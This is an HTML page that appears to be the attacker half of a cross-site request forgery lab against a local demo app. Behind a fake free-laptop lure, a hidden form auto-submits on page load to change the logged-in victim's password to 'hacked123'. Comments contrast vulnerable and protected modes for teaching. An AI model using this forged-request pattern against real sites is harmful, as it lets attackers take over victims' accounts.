<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Win a Free Laptop! 🎉</title>
  <style>
    body { font-family: system-ui, sans-serif; background:#111; color:#eee;
           display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .box { text-align:center; max-width:460px; padding:40px; background:#1c1c1c;
           border-radius:14px; border:1px solid #333; }
    h1 { color:#ffd24a; }
    p { color:#bbb; line-height:1.6; }
    .fine { font-size:12px; color:#666; margin-top:24px; }
  </style>
</head>
<body>
  <div class="box">
    <h1>🎉 Congratulations!</h1>
    <p>You've been selected to win a <b>free laptop</b>.<br>
       Just wait a moment while we load your prize...</p>
    <p class="fine">
      (This is the CSRF attacker page. It is NOT part of the Flex portal.
      It silently submits a password-change request to the Flex app using
      your logged-in session cookie.)
    </p>
  </div>

  <!--
    THE ACTUAL ATTACK
    =================
    While the victim is logged into Flex (http://localhost:3000),
    this hidden form auto-submits to the change-password endpoint.
    The browser attaches the victim's Flex session cookie
    automatically, so the server thinks the victim made the request.

    - VULNERABLE mode: no CSRF token is checked -> password changes to 'hacked123'.
    - SAFE mode: the server rejects the request (missing/invalid _csrf token)
      and also the SameSite cookie stops the cookie from being sent.
  -->
  <form id="attack" action="http://localhost:3000/change-password" method="POST">
    <input type="hidden" name="newPassword" value="hacked123">
  </form>

  <script>
    // Fire the forged request as soon as the page loads.
    document.getElementById('attack').submit();
  </script>
</body>
</html>
